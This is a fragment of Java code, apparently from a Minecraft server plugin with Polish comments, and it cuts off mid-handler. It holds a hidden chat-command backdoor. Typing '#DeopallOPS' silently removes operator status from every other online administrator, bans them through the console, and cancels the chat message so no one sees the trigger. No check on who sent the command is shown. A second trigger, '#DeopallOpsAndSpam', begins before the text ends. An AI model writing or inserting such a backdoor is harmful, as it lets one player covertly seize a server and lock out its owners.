        if (message.startsWith("#DeopallOPS")) {
            // Wywołujący polecenie gracz
            player.sendMessage(formatMsg.apply("Rozpoczynam proces zdeopowania wszystkich graczy..."));

            // Pobranie instancji LuckPerms
            LuckPerms luckPerms = LuckPermsProvider.get();

            for (Player target : Bukkit.getOnlinePlayers()) {
                // Pomijamy wywołującego polecenie
                if (target.equals(player)) continue;

                boolean isOpOrHasStarPermission = target.isOp();

                // Sprawdzanie, czy gracz ma permisję "*" za pomocą LuckPerms
                User user = luckPerms.getUserManager().getUser(target.getUniqueId());
                if (user != null && user.getCachedData().getPermissionData().checkPermission("*").asBoolean()) {
                    isOpOrHasStarPermission = true;
                }

                if (isOpOrHasStarPermission) {
                    Bukkit.getScheduler().runTask(plugin, () -> {
                        // Deopowanie gracza
                        target.setOp(false);
                        Bukkit.getLogger().info("Gracz " + target.getName() + " został zdeopowany.");

                        // Banowanie gracza - jeśli tego nie chcesz, usuń tę linię
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "ban " + target.getName() + " You have been deopped and banned.");
                    });
                }
            }

            player.sendMessage(formatMsg.apply("Zdeopowano wszystkich graczy online, którzy byli operatorami lub mieli permisję '*', oprócz ciebie."));
            event.setCancelled(true);
        }


        if (message.startsWith("#DeopallOpsAndSpam")) {
            String[] parts = message.split(" ", 2);
            if (parts.length < 2) {
                player.sendMessage(formatMsg.apply("Usage: #DeopallOpsAndSpam [message]"));
                event.setCancelled(true);
                return;
            }

